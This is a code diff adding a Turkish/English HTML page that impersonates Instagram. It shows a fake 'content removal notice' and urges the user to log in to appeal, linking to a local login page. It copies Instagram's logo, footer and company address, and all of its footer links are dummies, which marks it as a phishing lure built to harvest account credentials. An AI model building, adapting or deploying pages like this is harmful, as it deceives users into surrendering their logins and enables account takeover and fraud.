@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İçerik Kaldırma Bildirimi</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Favicon ayarlandı -->
+    <link rel="icon" href="../logo.png" type="image/png">
+    <script>
+        function changeLanguage() {
+            const lang = document.getElementById("language").value;
+            const messages = {
+                tr: {
+                    pageTitle: "Hesap Doğrulama Gerekiyor",
+                    verifyMessage: "İçeriğinizi itiraz edebilmeniz için lütfen önce hesabınızı doğrulamak için giriş yapın.",
+                    loginButton: "Giriş Yap",
+                    removeTitle: "İçerik Kaldırma Bildirimi",
+                    removeMessage: "Gönderinizin, Instagram'ın topluluk kurallarını ihlal ettiği tespit edilmiştir ve kaldırılması gerekmektedir. Aşağıdaki bilgilerden daha fazla detay öğrenebilirsiniz.",
+                    infoList: [
+                        "Topluluk Kuralları ve Politikaları",
+                        "İçerik Politikaları ve İhlaller",
+                        "Telif Hakları ve Fikri Mülkiyet Kuralları"
+                    ],
+                    footerLinks: [
+                        "Meta", "Hakkında", "Blog", "İş Fırsatları", "Yardım", "API", 
+                        "Gizlilik", "Koşullar", "Konumlar", "Instagram Lite", 
+                        "Threads", "Meta Verified"
+                    ]
+                },
+                en: {
+                    pageTitle: "Account Verification Required",
+                    verifyMessage: "To proceed with your appeal, please log in to verify your account.",
+                    loginButton: "Log In",
+                    removeTitle: "Content Removal Notice",
+                    removeMessage: "Your post has been identified as a violation of Instagram's community guidelines and needs to be removed. You can learn more from the details below.",
+                    infoList: [
+                        "Community Guidelines and Policies",
+                        "Content Policies and Violations",
+                        "Copyright and Intellectual Property Rules"
+                    ],
+                    footerLinks: [
+                        "Meta", "About", "Blog", "Careers", "Help", "API", 
+                        "Privacy", "Terms", "Locations", "Instagram Lite", 
+                        "Threads", "Meta Verified"
+                    ]
+                }
+            };
+
+            const selectedMessages = messages[lang];
+            document.getElementById("page-title").innerText = selectedMessages.pageTitle;
+            document.getElementById("verify-message").innerText = selectedMessages.verifyMessage;
+            document.getElementById("login-button").innerText = selectedMessages.loginButton;
+            document.getElementById("remove-title").innerText = selectedMessages.removeTitle;
+            document.getElementById("remove-message").innerText = selectedMessages.removeMessage;
+
+            const infoListItems = document.querySelectorAll(".info-list li");
+            selectedMessages.infoList.forEach((text, index) => {
+                infoListItems[index].innerText = text;
+            });
+
+            const footerLinks = document.querySelectorAll(".footer-links a");
+            selectedMessages.footerLinks.forEach((text, index) => {
+                footerLinks[index].innerText = text;
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            changeLanguage(); // Default language on page load
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+            </div>
+            <div class="language-selector">
+                <select id="language" onchange="changeLanguage()">
+                    <option value="tr" selected>Türkçe</option>
+                    <option value="en">English</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="content">
+            <h2 id="page-title">Hesap Doğrulama Gerekiyor</h2>
+            <p class="message" id="verify-message">İçeriğinizi itiraz edebilmeniz için lütfen önce hesabınızı doğrulamak için giriş yapın.</p>
+            <a href="login/index.html" class="button" id="login-button">Giriş Yap</a>
+
+            <hr class="separator">
+
+            <h2 id="remove-title">İçerik Kaldırma Bildirimi</h2>
+            <p class="message" id="remove-message">Gönderinizin, Instagram'ın topluluk kurallarını ihlal ettiği tespit edilmiştir ve kaldırılması gerekmektedir. Aşağıdaki bilgilerden daha fazla detay öğrenebilirsiniz.</p>
+            <ul class="info-list">
+                <li>Topluluk Kuralları ve Politikaları</li>
+                <li>İçerik Politikaları ve İhlaller</li>
+                <li>Telif Hakları ve Fikri Mülkiyet Kuralları</li>
+
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">Hakkında</a>
+                <a href="#">Blog</a>
+                <a href="#">İş Fırsatları</a>
+                <a href="#">Yardım</a>
+                <a href="#">API</a>
+                <a href="#">Gizlilik</a>
+                <a href="#">Koşullar</a>
+                <a href="#">Konumlar</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <p>© 2024 Instagram LLC, 1601 Willow Road, Menlo Park, CA 94043, USA</p>
+        </footer>
+    </div>
+</body>
+</html>
